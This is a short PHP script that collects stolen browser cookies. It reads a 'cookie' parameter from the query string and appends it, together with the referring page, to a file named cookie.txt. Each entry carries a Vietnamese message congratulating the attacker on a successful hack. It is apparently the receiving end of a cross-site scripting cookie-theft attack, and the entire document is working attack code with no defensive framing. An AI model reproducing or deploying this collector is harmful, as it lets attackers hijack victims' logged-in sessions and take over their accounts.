<?php
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    $file = fopen('cookie.txt', 'a');
    fwrite($file, $_SERVER['HTTP_REFERER']);
    fwrite($file, ".Chuc mung ban da hack thanh cong, Cookie la: " . $cookie . " \n");
    fclose($file);
}